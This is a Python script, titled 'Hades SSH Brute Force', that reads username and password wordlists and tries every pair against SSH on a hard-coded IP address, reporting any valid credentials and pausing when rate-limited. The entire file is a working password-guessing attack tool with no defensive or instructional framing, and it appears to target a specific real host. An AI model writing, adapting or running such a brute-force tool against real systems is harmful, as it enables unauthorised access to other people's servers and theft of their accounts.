import paramiko, argparse, time, signal, os
from colorama import *

class Utils():
	def Clear():
		os.system('cls' if os.name == 'nt' else 'clear')

	def Quit_Program(sig, frame):
		print("\n"+Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"✗"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Exiting AT Request Of User")
		os._exit(0)

	def Read_File(File_Name):
		try:
			f = open(File_Name, "r").read().split('\n')
			return f
		except Exception as e:
			print(str(e))

class SSH_Brute():

	def Parse():
		parser=argparse.ArgumentParser(description="Hades SSH Brute Force")
		parser.add_argument("--username",help="Username File Location")
		parser.add_argument("--password",help="Password File Location")
		parser.add_argument("--port", help="SSH Port To Brute (Defult Is 22)",type=int,default=22)
		args=parser.parse_args()

		try:
			Username_File = args.username
			Passowrd_File = args.password
			Port = args.port
		except AttributeError:
			print("Please Run --help")
			quit()

		Usernames = Utils.Read_File(Username_File)
		Passwords = Utils.Read_File(Passowrd_File)
		
		print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Initializing SSH Bruter ")
		for u in Usernames:
			for p in Passwords:
				SSH_Brute.Brute(u,p,Port)


	def Brute(Username, Password, Port):
		try:
			p = paramiko.SSHClient()
			p.set_missing_host_key_policy(paramiko.AutoAddPolicy())   
			p.connect("209.126.4.150", port=Port, username=Username, password=Password, banner_timeout=None)
			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTGREEN_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTGREEN_EX+"Found Valid Credentials "+Username + Fore.LIGHTWHITE_EX + ":" +Fore.LIGHTGREEN_EX+ Password)
		except (paramiko.ssh_exception.AuthenticationException):
			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Failed To Brute Using "+Username + Fore.LIGHTWHITE_EX + ":" +Fore.LIGHTRED_EX+ Password)
		except:
			print(Fore.LIGHTWHITE_EX+"["+Fore.LIGHTRED_EX+"Hades"+Fore.LIGHTWHITE_EX+"] "+Fore.LIGHTRED_EX+"Quota exceeded, Waiting 60 Seconds")
			time.sleep(60)
			SSH_Brute.Brute(Username,Password,Port)

		p.close()

signal.signal(signal.SIGINT, Utils.Quit_Program)
Utils.Clear()
SSH_Brute.Parse()
